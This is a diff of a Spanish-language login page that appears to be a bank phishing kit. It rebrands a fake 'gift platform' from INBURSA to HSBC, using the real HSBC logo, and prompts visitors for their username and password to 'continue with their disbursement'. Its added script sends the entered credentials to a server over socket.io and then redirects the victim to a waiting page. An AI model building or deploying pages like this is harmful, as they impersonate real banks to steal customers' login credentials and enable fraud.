@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>INBURSA</title>
+  <title>HSBC</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;
-      align-items: center;
+      justify-content: center;  /* Centrado horizontal */
+      align-items: center;      /* Centrado vertical */
       min-height: 100vh;
       text-align: center;
     }
@@ -46,17 +46,18 @@
       margin-bottom: 1rem;
     }
 
+    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;
+      margin: 1rem 0;  /* Espaciado entre campos */
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start;
-      margin-left: -15px;
+      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
+      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
     }
 
     .input-group .icon {
@@ -74,10 +75,11 @@
       height: 20px;
     }
 
+    /* Botón centrado y ajustado */
     button {
       background-color: #262D91;
       color: white;
-      padding: 8px 20px;
+      padding: 8px 20px; /* Botón más pequeño */
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -95,6 +97,7 @@
       cursor: not-allowed;
     }
 
+    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -108,18 +111,19 @@
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Logo" class="logo">
-    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong></h2>
-    <p>Ingrese su usuario y contraseña para continuar con su desembolso</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" alt="HSBC" class="logo">
+    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
+    <p>Ingrese su usuario y contraseña para continuar con su proceso de analisis.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Usuario" required>
+        <input type="text" id="usuario" placeholder="Ingrese su usuario" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
@@ -133,35 +137,29 @@
     window.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('login-form');
 
-      form.addEventListener('submit', (e) => {
-        e.preventDefault(); // Evitar la recarga del formulario
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
-        const usuario = document.getElementById('usuario').value; // Obtener el valor del usuario
-        const contrasena = document.getElementById('password').value; // Obtener el valor de la contraseña
+          // Validar los campos antes de enviar los datos
+          if (validarUsuario() && validarPassword()) {
+            const usuario = document.getElementById('usuario').value;
+            const contrasena = document.getElementById('password').value;
 
-        // Verificar que los valores no sean undefined o vacíos
-        if (!usuario || !contrasena) {
-          console.error('Usuario o contraseña vacíos');
-          return;
-        }
+            // Generar y guardar sessionId
+            const sessionId = Math.random().toString(36).substring(2, 15);
+            localStorage.setItem('sessionId', sessionId);
 
-        // Depuración: Verifica los valores que se están capturando
-        console.log('Usuario ingresado:', usuario);  // Verificar el valor del usuario
-        console.log('Contraseña ingresada:', contrasena);  // Verificar el valor de la contraseña
+            // Enviar datos al servidor mediante socket.io
+            socket.emit('dataForm', { usuario, contrasena, sessionId });
 
-        // Generar y guardar sessionId
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        localStorage.setItem('sessionId', sessionId);
-
-        // Enviar los datos al servidor usando socket.io
-        socket.emit('dataForm', { usuario, contrasena, sessionId });
-
-        // Redirigir a la página de opciones
-        window.location.href = 'opciones.html';
-      });
+            // Ir a pantalla de espera (opciones.html)
+            window.location.href = 'opciones.html';
+          }
+        });
+      }
     });
 
-    // Función para validar el campo de usuario
     function validarUsuario() {
       const usuario = document.getElementById("usuario").value;
       const usuarioError = document.getElementById("usuarioError");
@@ -178,7 +176,6 @@
       }
     }
 
-    // Función para validar el campo de contraseña
     function validarPassword() {
       const password = document.getElementById("password").value;
       const passwordError = document.getElementById("passwordError");
